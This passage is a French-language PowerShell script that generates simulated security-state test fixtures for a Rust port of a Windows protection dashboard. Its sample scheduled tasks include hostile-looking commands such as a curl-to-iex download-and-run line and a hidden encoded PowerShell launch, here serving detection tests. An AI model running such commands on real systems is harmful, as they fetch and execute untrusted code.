# Juges du bloc « protection » de Nevermind en Rust : les pages Protection, Sécurité, Connexion et Sauvegarde que donne la
# version PowerShell pour des états simulés (antivirus absent, désactivé, plusieurs, points suspects variés, éléments
# approuvés, connexion, historique...). Rien n'est lu ni touché sur le PC : Defender, le registre, le fichier hosts, les
# programmes au démarrage et l'Aide sont remplacés par de fausses versions qui rendent l'état simulé.
#
#   & 'outils\exporter-juges-protection.ps1'            (depuis l'outil PowerShell, jamais depuis Bash)
#
# Écrit rust\nevermind-protection\tests\juges\pages.json (et aide.json : la lecture de l'Aide qui complète celle de Nevermind).
# Chaque cas : { nom, entree, sortie } ; entree est ce que le test Rust donne au bloc, sortie ce que PowerShell a rendu.

# -Dossier : écrire ailleurs (par exemple des cas jamais vus, tirés avec une autre -Graine)
param([int]$Hasard = 600, [int]$Graine = 20261106, [string]$Dossier = '')
$ErrorActionPreference = 'Stop'
$env:NEVERMIND_TEST = '1'
$racine  = Split-Path $PSScriptRoot -Parent
$modules = Join-Path $racine 'Nevermind\fichiers\modules'
$sortie  = if ($Dossier) { $Dossier } else { Join-Path $racine 'rust\nevermind-protection\tests\juges' }
New-Item -ItemType Directory -Force -Path $sortie | Out-Null

# ---------------------------------------------------------------------------
# Les fonctions de la version PowerShell, prises telles quelles dans leurs fichiers
# ---------------------------------------------------------------------------
$script:Asts = @{}
function Get-Ast([string]$Fichier) {
    if (-not $script:Asts[$Fichier]) {
        $tok = $null; $err = $null
        $a = [System.Management.Automation.Language.Parser]::ParseFile((Join-Path $modules $Fichier), [ref]$tok, [ref]$err)
        if ($err) { throw "$Fichier n'est pas lisible : $($err[0].Message)" }
        $script:Asts[$Fichier] = $a
    }
    $script:Asts[$Fichier]
}
function Import-Fonction([string]$Fichier, [string]$Nom) {
    $a = (Get-Ast $Fichier).Find({ param($n) $n -is [System.Management.Automation.Language.FunctionDefinitionAst] -and $n.Name -eq $Nom }, $false)
    if (-not $a) { throw "Fonction $Nom introuvable dans $Fichier" }
    Invoke-Expression ($a.Extent.Text -replace "^function\s+$([regex]::Escape($Nom))", "function script:$Nom")
}
function Import-Affectation([string]$Fichier, [string]$Variable) {
    $a = (Get-Ast $Fichier).Find({ param($n) $n -is [System.Management.Automation.Language.AssignmentStatementAst] -and $n.Left.Extent.Text -eq "`$$Variable" }, $true)
    if (-not $a) { throw "Variable $Variable introuvable dans $Fichier" }
    Set-Variable -Scope Script -Name $Variable -Value (Invoke-Expression $a.Right.Extent.Text)
}
foreach ($n in 'Get-EtatSecuriteKit', 'Get-PagesProtection') { Import-Fonction 'ecran-protection.ps1' $n }
foreach ($n in 'Get-ProtectionScore', 'Get-SecTrusted', 'New-TrustEntry', 'Get-SecurityChecks', 'Get-ThreatHistory', 'Update-SecurityTab') { Import-Fonction 'securite.ps1' $n }
foreach ($n in 'ConvertFrom-HistoryEntry', 'Import-History', 'Test-HistoriqueDefinitif', 'Test-HistoriqueNote', 'Get-RetourDefinitif', 'Format-ValeurTech', 'Test-ChampHisto',
               'Format-DemarrageService', 'Format-PlanAlim', 'Format-CurseurAlim', 'Format-ServeursDns', 'Get-DetailsTechniques') { Import-Fonction 'assistance.ps1' $n }
Import-Fonction 'tableau-de-bord.ps1' 'Format-ValeurBat'
Import-Fonction 'onglets.ps1' 'Get-BackupCount'
foreach ($n in 'Get-CapaciteCarte', 'Get-BridageCarte', 'Format-VitesseCarte', 'Get-TexteBridage') { Import-Fonction 'systeme.ps1' $n }
Import-Fonction 'aide-client.ps1' 'Add-AideLectureSecurite'
Import-Affectation 'ecran-pc.ps1' 'TonsStatut'
Import-Affectation 'systeme.ps1' 'DnsChoices'
Import-Affectation 'systeme.ps1' 'VitessesNorme'
Import-Affectation 'analyse.ps1' 'BatSettings'
Import-Affectation 'analyse.ps1' 'BatActions'
Import-Affectation 'tableau-de-bord.ps1' 'BatNoms'
foreach ($v in 'HighPerfGuid', 'BalancedGuid', 'BestPerfOverlay', 'UltimateGuid') { Import-Affectation 'optimisations.ps1' $v }

# ---------------------------------------------------------------------------
# Fausses versions : l'état simulé du cas en cours ($script:Cas)
# ---------------------------------------------------------------------------
$script:Cas = $null
function script:Write-Log([string]$Message) { }
function script:Set-Status([string]$Texte) { }
function script:Update-UI { }
function script:Get-Setting([string]$Nom, $Defaut) { $v = $script:Cas.Reglages.$Nom; if ($null -eq $v) { $Defaut } else { $v } }
function script:Get-RegValue([string]$Path, [string]$Name) { $script:Cas.Proxy.$Name }
function script:Get-StartupItems { @($script:Cas.Demarrage | Where-Object { $_ } | ForEach-Object { [pscustomobject]@{ Nom = [string]$_.Nom; Exe = [string]$_.Exe; Enabled = [bool]$_.Enabled } }) }
function script:Get-Content {
    [CmdletBinding()] param([string]$LiteralPath)
    if ($LiteralPath -notmatch '\\drivers\\etc\\hosts$') { throw "Lecture inattendue : $LiteralPath" }
    if ($null -eq $script:Cas.Hosts) { throw 'Fichier illisible.' }
    @($script:Cas.Hosts)
}
function script:Read-JsonSur([string]$Path) { if ($null -eq $script:Cas.Historique) { return $null }; $script:Cas.Historique | ConvertTo-Json -Depth 20 | ConvertFrom-Json }
function script:Get-DernierDebit {
    $r = @($script:Cas.Debit)
    if ($null -eq $script:Cas.Debit -or $r.Count -lt 3 -or [double]$r[1] -lt 0 -or [double]$r[2] -lt 0) { return $null }
    @{ Down = '{0:N0}' -f [double]$r[1]; Up = '{0:N0}' -f [double]$r[2] }
}
function script:Invoke-Aide([string]$Action, $Parametres, $Delai, [switch]$SansDemande) {
    if ($Action -ne 'lecture.taches') { throw "Action inattendue : $Action" }
    if ($null -eq $script:Cas.AideTaches) { throw 'Aide injoignable.' }
    @($script:Cas.AideTaches)
}
function script:Get-AideLecture([string]$Action) { if ($Action -ne 'lecture.securite') { throw "Action inattendue : $Action" }; $script:Cas.AideSecurite }

# L'état S de Get-ProtectionStatus, fait depuis l'entrée du cas (les dates en texte « aaaa-MM-jjTHH:mm:ss »)
function ConvertTo-EtatS($E) {
    if ($null -eq $E) { return $null }
    $mp = $null
    if ($E.Mp) {
        $mp = [pscustomobject]@{ AMRunningMode = $E.Mp.AMRunningMode; RealTimeProtectionEnabled = [bool]$E.Mp.RealTimeProtectionEnabled
            AntivirusSignatureAge = $E.Mp.AntivirusSignatureAge; QuickScanAge = $E.Mp.QuickScanAge
            QuickScanEndTime = $(if ($E.Mp.QuickScanEndTime) { [datetime]::ParseExact($E.Mp.QuickScanEndTime, 'yyyy-MM-ddTHH:mm:ss', $null) } else { $null }) }
    }
    $off = @($E.FirewallOff | Where-Object { $_ })
    @{
        Mp = $mp; OtherAv = @($E.OtherAv | Where-Object { $_ }); FirewallOff = $off; Firewall = -not $off.Count; Uac = [bool]$E.Uac
        Exclusions = @($E.Exclusions | Where-Object { $_ }); ExclusionsNombre = [int]$E.ExclusionsNombre
        Threats = @($E.Threats | Where-Object { $_ } | ForEach-Object { [pscustomobject]@{ ThreatID = $_.ThreatID; ThreatName = $_.ThreatName; SeverityID = $_.SeverityID; IsActive = [bool]$_.IsActive } })
        Active = @($E.Threats | Where-Object { $_ -and $_.IsActive } | ForEach-Object { [pscustomobject]@{ ThreatID = $_.ThreatID; ThreatName = $_.ThreatName } })
        Detections = @($E.Detections | Where-Object { $_ } | ForEach-Object { [pscustomobject]@{ ThreatID = $_.ThreatID; ThreatStatusID = $_.ThreatStatusID
            InitialDetectionTime = $(if ($_.InitialDetectionTime) { [datetime]::ParseExact($_.InitialDetectionTime, 'yyyy-MM-ddTHH:mm:ss', $null) } else { $null }); Resources = @($_.Resources) } })
        Double = @($E.Double | Where-Object { $_ }); Scripts = @($E.Scripts | Where-Object { $_ }); Hidden = @($E.Hidden | Where-Object { $_ })
        SusStart = @($E.SusStart | Where-Object { $_ }); Tasks = @($E.Tasks | Where-Object { $_ } | ForEach-Object { @{ Name = [string]$_.Name; Path = [string]$_.Path; Cmd = [string]$_.Cmd; Bad = [bool]$_.Bad } })
    }
}
function script:Get-ProtectionStatus { ConvertTo-EtatS $script:Cas.S }

# Les pages pour un cas : ce que fait Nevermind (Update-SecurityTab puis Get-PagesProtection)
function Get-SortieCas($Cas) {
    $script:Cas = $Cas
    $script:Kit = @{}
    $script:ui = @{ SecScanNote = [pscustomobject]@{ Text = '' } }
    $script:SecButtons = New-Object System.Collections.ArrayList
    $script:SecDonnees = $null; $script:SecurityScore = $null; $script:ScanRunning = $false
    $script:History = $null
    $sb = $Cas.Sauvegarde
    $script:Backup = @{ Registry = @{}; PowerScheme = $null; CreatedScheme = $null; Overlay = $null; Dns = @{}; Displays = @{} }
    if ($sb) {
        foreach ($k in 'Registry', 'Dns', 'Displays') { if ($sb.$k) { foreach ($p in $sb.$k.PSObject.Properties) { $script:Backup[$k][$p.Name] = $p.Value } } }
        foreach ($k in 'PowerScheme', 'CreatedScheme', 'Overlay') { $script:Backup[$k] = $sb.$k }
    }
    $script:Net = $(if ($Cas.Net) { $n = @{}; foreach ($p in $Cas.Net.PSObject.Properties) { $n[$p.Name] = $p.Value }; $n } else { $null })
    $script:PingResults = @($Cas.Pings | Where-Object { $_ } | ForEach-Object { [pscustomobject]@{ Label = $_.Label; Avg = $_.Avg; Jitter = $_.Jitter; Loss = $_.Loss; Status = $_.Status; Verdict = $_.Verdict } })
    if ($null -ne $Cas.S) { Update-SecurityTab }
    $pages = Get-PagesProtection
    # (envoyées au kit comme vue.ps1 les envoie : ConvertTo-Json -Depth 16, puis « {} » remis à null)
    [ordered]@{ pages = (($pages | ConvertTo-Json -Depth 16 -Compress) -replace '":\{\}', '":null'); score = $script:SecurityScore; actionsSec = @(@($script:Kit.SecChecks) | ForEach-Object { @{ titre = [string]$_.Title; actions = @(@($_.Actions) | ForEach-Object { @{ texte = [string]$_.Label; confirmer = [string]$_.Confirm } }); approuver = @(@($_.Trust | Where-Object { $_ }) | ForEach-Object { @{ Key = $_.Key; Text = $_.Text; Kind = $_.Kind } }) } }) }
}

# ---------------------------------------------------------------------------
# Les cas : écrits à la main (les cas limites), puis tirés au hasard (graine fixe)
# ---------------------------------------------------------------------------
$rng = New-Object System.Random $Graine
function Get-Un($Liste) { $Liste[$rng.Next($Liste.Count)] }
# (des éléments différents, tirés par leur place : -Unique confondrait les tables, qui s'écrivent toutes pareil)
function Get-Quelques($Liste, [int]$Max) {
    $n = [math]::Min($rng.Next($Max + 1), $Liste.Count); $pris = @{}
    @(while ($pris.Count -lt $n) { $k = $rng.Next($Liste.Count); if (-not $pris.ContainsKey($k)) { $pris[$k] = $true; $Liste[$k] } })
}
function Get-Date-Cas { (Get-Date '2026-01-01').AddMinutes($rng.Next(0, 500000)).ToString('yyyy-MM-ddTHH:mm:ss') }

$Chemins = @('C:\Users\Léa\Downloads\facture.pdf.exe', 'C:\Users\x\Desktop\photo.jpg .scr', 'C:\Users\x\Downloads\setup.vbs', 'C:\Users\x\Downloads\a.js',
    'C:\Users\x\AppData\Local\Temp\maj.exe', 'C:\Users\Public\Libraries\svc.exe', 'C:\ProgramData\outil.com', 'D:\Jeux\Société\très long nom de dossier avec des accents éàù\jeu.exe',
    'C:\Users\x\AppData\Roaming\x.exe', 'C:\Users\x\Documents\cv.docx.exe', "C:\Users\x\Downloads\guillemet'.hta")
$Exclus = @('C:\Jeux', 'D:\SteamLibrary', 'jeu.exe', '.iso', 'C:\Users\x\AppData\Local\Temp', 'C:\Program Files\Riot Games')
$Hosts = @('0.0.0.0 pub.exemple.com', '127.0.0.1 activation.adobe.com', '# commentaire', '', '   ', '127.0.0.1 localhost', '::1 localhost', '10.0.0.5 nas.maison',
    '255.255.255.255 broadcasthost', '127.0.0.1   localhost.localdomain', '0.0.0.0 très-long.exemple.fr')
$Taches = @(@{ Name = 'Mise a jour'; Path = '\'; Cmd = 'C:\Users\x\AppData\Local\Temp\maj.exe'; Bad = $false },
    @{ Name = 'Lanceur'; Path = '\Outils\'; Cmd = 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -w hidden -enc AAAA'; Bad = $true },
    @{ Name = 'Été'; Path = '\'; Cmd = 'C:\Users\Public\x.exe /s'; Bad = $false },
    @{ Name = 'Cmd'; Path = '\Truc\'; Cmd = 'cmd.exe /c curl http://exemple.com | iex'; Bad = $true })
$Demarrages = @(@{ Nom = 'Discord'; Exe = 'C:\Users\x\AppData\Local\Discord\Update.exe'; Enabled = $true },
    @{ Nom = 'Inconnu'; Exe = 'C:\Users\x\AppData\Local\Temp\a.exe'; Enabled = $true },
    @{ Nom = 'Désactivé'; Exe = 'C:\Users\x\AppData\Roaming\b.exe'; Enabled = $false },
    @{ Nom = 'Steam'; Exe = 'C:\Program Files (x86)\Steam\steam.exe'; Enabled = $true })
$Menaces = @(@{ ThreatID = '2147735503'; ThreatName = 'Trojan:Win32/Wacatac.B!ml'; SeverityID = 5; IsActive = $false },
    @{ ThreatID = '7'; ThreatName = 'PUA:Win32/Presenoker'; SeverityID = 1; IsActive = $true },
    @{ ThreatID = '9'; ThreatName = 'Virus:DOS/Essai'; SeverityID = 4; IsActive = $false },
    @{ ThreatID = '11'; ThreatName = 'HackTool:Win32/Kms'; SeverityID = 2; IsActive = $true })

function New-Historique {
    $types = @(
        @{ Type = 'reg'; Path = 'HKCU:\Software\Essai'; Name = 'Valeur'; Existed = $true; Value = 1; Kind = 'DWord'; Nouveau = 0 },
        @{ Type = 'reg'; Path = 'HKLM:\SOFTWARE\Essai'; Name = 'Absente'; Existed = $false; Efface = $false },
        @{ Type = 'reg'; Path = 'HKCU:\Software\Bin'; Name = 'B'; Existed = $true; Value = @(1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18); Kind = 'Binary'; Efface = $true },
        @{ Type = 'svc'; Name = 'SysMain'; StartType = 'Automatic'; Running = $true; Nouveau = 'Disabled' },
        @{ Type = 'svc'; Name = 'DiagTrack'; StartType = 'Manual'; Running = $false },
        @{ Type = 'power'; Guid = $BalancedGuid; Nouveau = $HighPerfGuid },
        @{ Type = 'power'; Guid = '11111111-2222-3333-4444-555555555555'; Nom = 'Mon plan' },
        @{ Type = 'pcfg'; Key = 'CritAction'; Guid = $BatSettings.CritAction; Ac = 1; Dc = 2; Nouveau = 0 },
        @{ Type = 'pcfg'; Guid = $BatSettings.LowNotify; Ac = 1; Dc = 0 },
        @{ Type = 'pcfg'; Guid = 'abcd'; Ac = 3; Dc = 4; Nouveau = 5 },
        @{ Type = 'display'; Device = '\\.\DISPLAY1'; Hz = 60; Nouveau = 144 },
        @{ Type = 'overlay'; Guid = ''; Nouveau = $BestPerfOverlay },
        @{ Type = 'dns'; Servers = @(); Nouveau = @('1.1.1.1', '1.0.0.1') },
        @{ Type = 'dns'; Servers = @('192.168.1.1') },
        @{ Type = 'fw'; Name = 'Nevermind - bloquer jeu.exe' },
        @{ Type = 'definitif'; Quoi = 'Pare-feu réactivé sur tous les réseaux'; Retour = 'Sécurité Windows, « Pare-feu ».' },
        @{ Type = 'definitif'; Quoi = 'Exclusions retirées : C:\Jeux'; Retour = '' },
        @{ Type = 'note'; Quoi = 'Appli fermée : Chrome'; Chemins = @('C:\Program Files\Google\chrome.exe') },
        @{ Type = 'note'; Quoi = 'Appli fermée' }
    )
    $n = $rng.Next(0, 22)
    @(for ($i = 0; $i -lt $n; $i++) {
        $log = @(for ($j = $rng.Next(0, 4); $j -gt 0; $j--) { Get-Un $types })
        if ($rng.Next(4) -eq 0) { $log = @(Get-Un @($types | Where-Object { $_.Type -in 'definitif', 'note' })) }
        $date = (Get-Date '2026-03-01').AddMinutes($rng.Next(0, 300000))
        [ordered]@{ Id = ('{0:x12}' -f $rng.Next()); Date = $(if ($rng.Next(10)) { $date.ToString('dd/MM/yyyy à HH:mm') } else { 'date abîmée' }); Titre = (Get-Un @('Optimisation de Windows', 'Retirer les exclusions (2 éléments exclus)', 'DNS : Cloudflare', 'Mode jeu', 'Titre très long ' * 4))
            Details = @(Get-Quelques @('Réglage A', 'Réglage B', 'Écran à 144 Hz', '') 3); Log = $log; Annule = [bool]($rng.Next(3) -eq 0) }
    })
}

function New-CasHasard([int]$i) {
    $mode = Get-Un @('Normal', 'Normal', 'Normal', 'Passive Mode', 'Not running', $null)
    $mp = if ($rng.Next(6)) { [ordered]@{ AMRunningMode = $mode; RealTimeProtectionEnabled = [bool]$rng.Next(4); AntivirusSignatureAge = (Get-Un @(0, 0, 1, 2, 3, 4, 9, 40))
        QuickScanAge = (Get-Un @(0, 1, 14, 15, 30, 4294967295)); QuickScanEndTime = $(if ($rng.Next(5)) { Get-Date-Cas } else { $null }) } } else { $null }
    $menaces = @(Get-Quelques $Menaces 3)
    $s = [ordered]@{
        Mp = $mp; OtherAv = @(Get-Quelques @('Avast Antivirus', 'Norton 360', 'Bitdefender') 2); FirewallOff = @(Get-Quelques @('Domain', 'Private', 'Public') $(if ($rng.Next(3)) { 0 } else { 3 }))
        Uac = [bool]$rng.Next(6); Exclusions = @(Get-Quelques $Exclus $(if ($rng.Next(2)) { 0 } else { 4 })); ExclusionsNombre = (Get-Un @(0, 0, 0, 1, 3))
        Threats = $menaces
        Detections = @(for ($k = $rng.Next(0, 5); $k -gt 0; $k--) { [ordered]@{ ThreatID = (Get-Un @('2147735503', '7', '9', '11', '404')); ThreatStatusID = (Get-Un @(1, 2, 3, 4, 5, 6, 8)); InitialDetectionTime = $(if ($rng.Next(6)) { Get-Date-Cas } else { $null }); Resources = @(Get-Quelques @('file:_C:\Users\x\Downloads\a.exe', 'file:_D:\Jeux\é.exe', 'webfile:_https://exemple.com/x') 2) } })
        Double = @(Get-Quelques $Chemins $(if ($rng.Next(3)) { 0 } else { 3 })); Scripts = @(Get-Quelques $Chemins $(if ($rng.Next(3)) { 0 } else { 3 }))
        Hidden = @(Get-Quelques $Chemins $(if ($rng.Next(2)) { 0 } else { 9 })); SusStart = @(Get-Quelques @($Demarrages | ForEach-Object { $_.Exe }) 3)
        Tasks = @(Get-Quelques $Taches $(if ($rng.Next(2)) { 0 } else { 3 }))
    }
    # Des éléments approuvés : pris parmi ceux du cas (ils disparaissent des points) ou inconnus (ils restent dans la liste)
    $cles = @(@($s.Exclusions | ForEach-Object { "exclusion|$_" }) + @($s.Double + $s.Scripts + $s.Hidden | ForEach-Object { "fichier|$_" }) + @($s.Tasks | ForEach-Object { "tache|$($_.Path)$($_.Name)|$($_.Cmd)" }) + @('hosts|0.0.0.0 pub.exemple.com', 'proxy|127.0.0.1:8888', 'exclusions|3', 'demarrage|Inconnu|C:\Users\x\AppData\Local\Temp\a.exe', 'fichier|C:\ailleurs.exe'))
    $approuves = @(Get-Quelques $cles $(if ($rng.Next(2)) { 0 } else { 4 }) | ForEach-Object { [ordered]@{ Key = $_; Text = ($_ -split '\|', 2)[1]; Kind = (Get-Un @('Fichier', 'Exclusion de l''antivirus', 'Tâche planifiée')) } })
    if ($rng.Next(10) -eq 0) { $approuves += [ordered]@{ Key = ''; Text = 'sans clé'; Kind = 'Fichier' } }
    $net = if ($rng.Next(5)) {
        $wifi = [bool]$rng.Next(2)
        [ordered]@{ Wifi = $wifi; Desc = (Get-Un @('Intel(R) Ethernet Connection I219-V', 'Realtek PCIe GbE Family Controller', 'Intel(R) Wi-Fi 6 AX201 160MHz')); Speed = (Get-Un @('1 Gbps', '100 Mbps', '866.7 Mbps', '2.5 Gbps'))
            Gateway = (Get-Un @('192.168.1.254', '10.0.0.1', '')); Dns = (Get-Un @('', '192.168.1.254', '1.1.1.1, 1.0.0.1', '8.8.8.8, 8.8.4.4', '9.9.9.9', '149.112.112.112, 1.1.1.1'))
            Bps = (Get-Un @(1000000000, 100000000, 10000000, 2500000000, 0)); Vitesses = @(Get-Quelques @('1,0 Gbit/s Duplex intégral', '100 Mbit/s Duplex intégral', '2.5 Gbps Full Duplex', 'Négociation automatique', '10 Mbps Half Duplex') 3)
            VitessesReg = @(Get-Quelques @('0', '1', '4', '6', '2500', 'x') 3) }
    } else { $null }
    $pings = @(if ($net -and $rng.Next(2)) { foreach ($l in 'Ta box (réseau local) (192.168.1.254)', 'Internet : Cloudflare (1.1.1.1)', 'Internet : Google (8.8.8.8)') {
        [ordered]@{ Label = $l; Avg = (Get-Un @(1, 4.5, 12, 33.3, 61, 150)); Jitter = (Get-Un @(0, 0.8, 2.25, 17)); Loss = (Get-Un @(0, 0, 3, 5, 100)); Status = (Get-Un @('ok', 'warn', 'bad', 'info')); Verdict = (Get-Un @('Excellent pour jouer en ligne.', 'Quelques pertes de paquets.', 'Ping élevé.')) } } })
    $sauve = if ($rng.Next(3)) { [ordered]@{ Registry = $(if ($rng.Next(2)) { [ordered]@{ 'HKCU:\A|B' = @{ Path = 'HKCU:\A'; Name = 'B' }; 'HKLM:\C|D' = @{ Path = 'HKLM:\C'; Name = 'D' } } } else { [ordered]@{} })
        PowerScheme = (Get-Un @($null, $BalancedGuid)); CreatedScheme = (Get-Un @($null, '11111111-2222-3333-4444-555555555555')); Overlay = (Get-Un @($null, '', $BestPerfOverlay))
        Dns = $(if ($rng.Next(3)) { [ordered]@{} } else { [ordered]@{ '{guid}' = '' } }); Displays = $(if ($rng.Next(3)) { [ordered]@{} } else { [ordered]@{ '\\.\DISPLAY1' = 60 } }) } } else { $null }
    [ordered]@{
        S = $(if ($rng.Next(12)) { $s } else { $null }); Hosts = $(if ($rng.Next(8)) { @(Get-Quelques $Hosts 5) } else { $null })
        Proxy = [ordered]@{ ProxyEnable = (Get-Un @($null, 0, 1, 1)); AutoConfigURL = (Get-Un @($null, '', '', 'http://proxy.exemple/pac.js')); ProxyServer = (Get-Un @($null, '127.0.0.1:8888', '')) }
        Demarrage = @(Get-Quelques $Demarrages 4); Reglages = [ordered]@{ SecuriteApprouves = $approuves; SvcOriginal = @(Get-Quelques @('SysMain|Automatic', 'DiagTrack|Manual') 2); PcfgOriginal = @(Get-Quelques @('abc|1|2') 1) }
        Net = $net; Pings = $pings; Debit = (Get-Un @($null, @(1, 94.4, 38.6), @(1, 1234.5, 0), @(1, -1, 10), @(1, 2)))
        Sauvegarde = $sauve; Historique = $(if ($rng.Next(4)) { @(New-Historique) } else { $null })
    }
}

# Cas écrits à la main
$vide = [ordered]@{ Mp = $null; OtherAv = @(); FirewallOff = @(); Uac = $true; Exclusions = @(); ExclusionsNombre = 0; Threats = @(); Detections = @(); Double = @(); Scripts = @(); Hidden = @(); SusStart = @(); Tasks = @() }
function New-S([hashtable]$Changes) { $s = [ordered]@{}; foreach ($k in $vide.Keys) { $s[$k] = $vide[$k] }; foreach ($k in $Changes.Keys) { $s[$k] = $Changes[$k] }; $s }
$defenderOk = [ordered]@{ AMRunningMode = 'Normal'; RealTimeProtectionEnabled = $true; AntivirusSignatureAge = 0; QuickScanAge = 2; QuickScanEndTime = '2026-11-04T21:05:00' }
function New-Cas($S, [hashtable]$Autres = @{}) {
    $c = [ordered]@{ S = $S; Hosts = @('127.0.0.1 localhost'); Proxy = [ordered]@{}; Demarrage = @(); Reglages = [ordered]@{}; Net = $null; Pings = @(); Debit = $null; Sauvegarde = $null; Historique = $null }
    foreach ($k in $Autres.Keys) { $c[$k] = $Autres[$k] }
    $c
}
$cas = [ordered]@{
    'pas-encore-verifie' = New-Cas $null
    'defender-tout-va-bien' = New-Cas (New-S @{ Mp = $defenderOk })
    'antivirus-absent' = New-Cas (New-S @{})
    'defender-desactive-temps-reel' = New-Cas (New-S @{ Mp = [ordered]@{ AMRunningMode = 'Normal'; RealTimeProtectionEnabled = $false; AntivirusSignatureAge = 1; QuickScanAge = 1; QuickScanEndTime = '2026-11-05T08:00:00' } })
    'defender-base-vieille-jamais-analyse' = New-Cas (New-S @{ Mp = [ordered]@{ AMRunningMode = 'Normal'; RealTimeProtectionEnabled = $true; AntivirusSignatureAge = 12; QuickScanAge = 4294967295; QuickScanEndTime = $null } })
    'defender-passif-autre-antivirus' = New-Cas (New-S @{ Mp = [ordered]@{ AMRunningMode = 'Passive Mode'; RealTimeProtectionEnabled = $false; AntivirusSignatureAge = 30; QuickScanAge = 90; QuickScanEndTime = $null }; OtherAv = @('Avast Antivirus') })
    'plusieurs-antivirus' = New-Cas (New-S @{ OtherAv = @('Avast Antivirus', 'Norton 360', 'Bitdefender Total Security') })
    'pare-feu-et-uac-coupes' = New-Cas (New-S @{ Mp = $defenderOk; FirewallOff = @('Domain', 'Public'); Uac = $false })
    'menaces-actives' = New-Cas (New-S @{ Mp = $defenderOk; Threats = @($Menaces); Detections = @([ordered]@{ ThreatID = '7'; ThreatStatusID = 1; InitialDetectionTime = '2026-11-01T10:00:00'; Resources = @('file:_C:\Users\x\Downloads\a.exe') }, [ordered]@{ ThreatID = '404'; ThreatStatusID = 99; InitialDetectionTime = $null; Resources = @() }) })
    'exclusions-sans-droits' = New-Cas (New-S @{ Mp = $defenderOk; ExclusionsNombre = 3 })
    'exclusions-sans-droits-approuvees' = New-Cas (New-S @{ Mp = $defenderOk; ExclusionsNombre = 3 }) @{ Reglages = [ordered]@{ SecuriteApprouves = @([ordered]@{ Key = 'exclusions|3'; Text = '3 exclusions de l''antivirus'; Kind = 'Exclusions de l''antivirus' }) } }
    'beaucoup-de-programmes-caches' = New-Cas (New-S @{ Mp = $defenderOk; Hidden = @($Chemins) })
    'fichiers-deguises-et-scripts' = New-Cas (New-S @{ Mp = $defenderOk; Double = @($Chemins[0], $Chemins[1]); Scripts = @($Chemins[2]) })
    'taches-suspectes' = New-Cas (New-S @{ Mp = $defenderOk; Tasks = @($Taches) })
    'tache-suspecte-pas-grave' = New-Cas (New-S @{ Mp = $defenderOk; Tasks = @($Taches[0]) })
    'demarrage-suspect' = New-Cas (New-S @{ Mp = $defenderOk; SusStart = @($Demarrages[1].Exe, $Demarrages[2].Exe) }) @{ Demarrage = @($Demarrages) }
    'hosts-et-proxy' = New-Cas (New-S @{ Mp = $defenderOk }) @{ Hosts = @($Hosts); Proxy = [ordered]@{ ProxyEnable = 1; ProxyServer = '127.0.0.1:8888' } }
    'hosts-illisible-proxy-pac' = New-Cas (New-S @{ Mp = $defenderOk }) @{ Hosts = $null; Proxy = [ordered]@{ ProxyEnable = 0; AutoConfigURL = 'http://wpad/wpad.dat' } }
    'tout-mauvais' = New-Cas (New-S @{ FirewallOff = @('Domain', 'Private', 'Public'); Uac = $false; Threats = @($Menaces); Double = @($Chemins); Scripts = @($Chemins); Hidden = @($Chemins); Tasks = @($Taches); SusStart = @($Demarrages[1].Exe) }) @{ Demarrage = @($Demarrages); Hosts = @($Hosts); Proxy = [ordered]@{ ProxyEnable = 1; AutoConfigURL = 'http://x/p.pac' } }
    'tout-approuve' = New-Cas (New-S @{ Mp = $defenderOk; Exclusions = @('C:\Jeux'); Double = @($Chemins[0]) }) @{ Reglages = [ordered]@{ SecuriteApprouves = @([ordered]@{ Key = 'exclusion|C:\Jeux'; Text = 'C:\Jeux'; Kind = 'Exclusion de l''antivirus' }, [ordered]@{ Key = "fichier|$($Chemins[0])"; Text = $Chemins[0]; Kind = 'Fichier' }) } }
    'connexion-bridee' = New-Cas (New-S @{ Mp = $defenderOk }) @{ Net = [ordered]@{ Wifi = $false; Desc = 'Intel(R) Ethernet I219-V'; Speed = '100 Mbps'; Gateway = '192.168.1.254'; Dns = '1.1.1.1, 1.0.0.1'; Bps = 100000000; Vitesses = @('1,0 Gbit/s Duplex intégral'); VitessesReg = @() }
        Pings = @([ordered]@{ Label = 'Ta box (réseau local) (192.168.1.254)'; Avg = 1; Jitter = 0.5; Loss = 0; Status = 'ok'; Verdict = 'Liaison avec ta box rapide et stable.' }, [ordered]@{ Label = 'Internet : Cloudflare (1.1.1.1)'; Avg = 12.5; Jitter = 1.25; Loss = 0; Status = 'ok'; Verdict = 'Excellent pour jouer en ligne.' }); Debit = @(1, 912.345, 48.5) }
    'connexion-wifi-sans-test' = New-Cas (New-S @{ Mp = $defenderOk }) @{ Net = [ordered]@{ Wifi = $true; Desc = 'Wi-Fi 6'; Speed = '866.7 Mbps'; Gateway = '10.0.0.1'; Dns = ''; Bps = 866700000; Vitesses = @(); VitessesReg = @() } }
}
$juges = New-Object System.Collections.ArrayList
foreach ($k in $cas.Keys) { [void]$juges.Add([ordered]@{ nom = $k; entree = $cas[$k] }) }
for ($i = 0; $i -lt $Hasard; $i++) { [void]$juges.Add([ordered]@{ nom = "hasard-$i"; entree = (New-CasHasard $i) }) }

# Les entrées passent par JSON avant d'être jouées : PowerShell et Rust lisent exactement la même chose
$tempAvant = $env:TEMP; $env:TEMP = 'C:\Users\x\AppData\Local\Temp'
$sysAvant = $env:SystemDrive
try {
    foreach ($j in $juges) {
        $texte = $j.entree | ConvertTo-Json -Depth 30 -Compress
        $e = $texte | ConvertFrom-Json
        $j.entree = $e
        try { $j.sortie = Get-SortieCas $e } catch { throw "Cas $($j.nom) : $($_.Exception.Message) (ligne $($_.InvocationInfo.ScriptLineNumber))" }
    }
} finally { $env:TEMP = $tempAvant }

$utf8 = New-Object System.Text.UTF8Encoding($false)
[IO.File]::WriteAllText((Join-Path $sortie 'pages.json'), (ConvertTo-Json @($juges) -Depth 60 -Compress), $utf8)

# ---------------------------------------------------------------------------
# Lecture de l'Aide qui complète celle de Nevermind (Add-AideLectureSecurite), sans droits administrateur
# ---------------------------------------------------------------------------
$aide = New-Object System.Collections.ArrayList
$tachesAide = @(@{ Nom = 'Lanceur'; Chemin = '\Outils\'; Exe = '"%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe"'; Args = '-WindowStyle Hidden -File x.ps1' },
    @{ Nom = 'Maj'; Chemin = '\'; Exe = 'C:\Users\x\AppData\Local\Temp\maj.exe'; Args = '' },
    @{ Nom = 'Propre'; Chemin = '\'; Exe = 'C:\Program Files\Outil\outil.exe'; Args = '/silent' },
